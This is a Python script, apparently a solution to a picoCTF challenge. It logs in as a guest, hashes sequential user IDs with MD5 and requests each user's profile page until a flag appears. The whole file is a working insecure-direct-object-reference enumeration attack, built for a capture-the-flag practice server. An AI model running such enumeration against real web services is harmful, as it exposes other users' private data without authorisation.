import hashlib
import requests
import time
import sys

BASE = "http://crystal-peak.picoctf.net:51590"
EMAIL = "guest@picoctf.org"
PASSWORD = "guest"

if len(sys.argv) != 3:
    print(f"Usage: python {sys.argv[0]} <start_id> <end_id>")
    sys.exit(1)

start_id = int(sys.argv[1])
end_id = int(sys.argv[2])

session = requests.Session()

print(f"[+] Logging in for range {start_id} -> {end_id}...")
r = session.post(
    f"{BASE}/login",
    json={"email": EMAIL, "password": PASSWORD}
)

known_guest_markers = [
    "Access level: Guest",
    "ID: 3000",
    "Insufficient privileges"
]

start_time = time.time()

for uid in range(start_id, end_id + 1):
    digest = hashlib.md5(str(uid).encode()).hexdigest()
    url = f"{BASE}/profile/user/{digest}"

    try:
        resp = session.get(url, timeout=5)
        body = resp.text
    except requests.RequestException:
        continue

    elapsed = time.time() - start_time
    speed = (uid - start_id + 1) / elapsed if elapsed > 0 else 0

    sys.stdout.write(
        f"\r[SCAN {start_id}-{end_id}] Testing ID {uid} | {speed:.1f} req/s"
    )
    sys.stdout.flush()

    if "User not found." in body:
        continue

    if all(marker in body for marker in known_guest_markers):
        continue

    print("\n\n[!] Interesting response found!")
    print(f"[+] User ID: {uid}")
    print(f"[+] Hash: {digest}")
    print(f"[+] URL: {url}")
    print(body[:1000])

    if "picoCTF{" in body:
        print("\n[FLAG FOUND!]")
        break
